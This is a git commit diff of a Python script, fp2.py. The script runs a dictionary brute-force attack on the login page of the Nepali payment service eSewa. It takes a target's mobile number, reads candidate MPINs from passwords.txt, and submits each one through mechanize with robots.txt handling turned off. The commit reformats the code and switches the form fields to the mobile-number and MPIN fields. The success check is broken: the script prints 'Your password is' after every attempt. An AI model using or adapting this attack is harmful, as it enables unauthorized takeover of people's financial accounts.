795de68adaa56bad9496820a76e2057d544e4547
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-04 03:37:54 +0545

    Update fp2.py

--- fp2.py
+++ fp2.py
@@ -1,55 +1,59 @@
 import time
 import sys
 
-if sys.version_info[0] !=2: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 2.x
-	use: python fb2.py
+if sys.version_info[0] != 2:
+    print('''--------------------------------------
+    REQUIRED PYTHON 2.x
+    use: python fb2.py
 --------------------------------------
-			''')
-	sys.exit()
+        ''')
+    sys.exit()
 
-post_url='https://www.esewa.com.np/login.php'
+post_url = 'https://www.esewa.com.np/login.php'
 headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
 
 try:
-	import mechanize
-	import urllib2
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
-	print('\n\tPlease install mechanize.\n')
-	sys.exit()
+    import mechanize
+    browser = mechanize.Browser()
+    browser.addheaders = [('User-Agent', headers['User-Agent'])]
+    browser.set_handle_robots(False)
+except ImportError:
+    print('\nPlease install mechanize.\n')
+    sys.exit()
 
 print('\n---------- Welcome Vicky ----------\n')
-file=open('passwords.txt','r')
+file = open('passwords.txt', 'r')
 
-number=str(raw_input('number : ').strip())
+MobileNumber = str(raw_input('Mobile Number : ').strip())
 
-print ("\nTarget number : ",number)
-print "\nTrying Passwords from list ..."
+print("\nTarget Mobile Number : ", MobileNumber)
+print("\nTrying Passwords from list ...")
 
-i=0
-while file:
-	passw=file.readline().strip()
-	i+=1
-	if len(passw) < 4:
-		continue
-	print str(i) +" : ",passw
-	response = browser.open(post_url)
-	try:
-		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['number'] = number
-			browser.form['pass'] = passw
-			response = browser.submit()
-			response_data = response.read()
-			
-                        print('Your password is : ',passw)
-		
-	except:
-		print('\nSleeping for time : 0 min\n')
-		time.sleep(00)
+i = 0
+while True:
+    passw = file.readline().strip()
+    i += 1
+    if len(passw) < 4:
+        continue
+    print(str(i) + " : " + passw)
+    response = browser.open(post_url)
+    try:
+        if response.code == 200:
+            browser.select_form(nr=0)
+            browser.form['Mobile Number'] = MobileNumber
+            browser.form['MPIN'] = passw
+            response = browser.submit()
+            response_data = response.read()
+            print(response_data.decode('utf-8'))
+            print('Your password is : ', passw)
+
+    except Exception as e:
+        print('\nSleeping for time : 0 min\n')
+        time.sleep(0)
+
+    if not passw:
+        break
+
+file.close()
